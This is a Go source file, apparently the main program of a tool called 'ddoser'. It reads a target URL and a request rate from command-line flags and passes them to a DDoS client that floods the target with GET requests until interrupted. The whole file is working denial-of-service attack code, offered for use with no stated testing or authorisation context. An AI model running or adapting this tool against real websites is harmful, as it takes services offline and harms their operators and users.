package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"time"

	"github.com/goodleby/ddoser/client/ddos"
)

func main() {
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, os.Kill)
	defer cancel()

	url, rate, timeout, err := ReadFlags()
	if err != nil {
		log.Fatalf("Error reading flags: %v", err)
	}

	ddosClient, err := ddos.NewClient(timeout)
	if err != nil {
		log.Fatalf("Error creating ddos client: %v", err)
	}

	requestGenerator := NewRequestGenerator(url)

	go func() {
		err = ddosClient.DDoS(ctx, requestGenerator, rate)
		if err != nil {
			log.Printf("Error ddosing: %v", err)
			cancel()
		}
	}()

	<-ctx.Done()

	log.Println("Stopped ddosing")
}

// TODO: Allow for custom methods, body and headers
func NewRequestGenerator(url string) ddos.RequestGenerator {
	return func(ctx context.Context) (*http.Request, error) {
		return http.NewRequestWithContext(
			ctx,
			http.MethodGet,
			url,
			nil,
		)
	}
}

func ReadFlags() (string, int, time.Duration, error) {
	// Required
	var url string
	flag.StringVar(&url, "url", "", "Target URL to make requests to.")

	var rate int
	flag.IntVar(&rate, "rate", 0, "Amount of requests per second.")

	// Optional
	var httpTimeout time.Duration
	flag.DurationVar(&httpTimeout, "http-timeout", 1*time.Second, "HTTP client timeout.")

	flag.Parse()

	if url == "" {
		return "", 0, 0, fmt.Errorf("missing required url flag")
	}
	if rate == 0 {
		return "", 0, 0, fmt.Errorf("missing required rate flag")
	}

	return url, rate, httpTimeout, nil
}
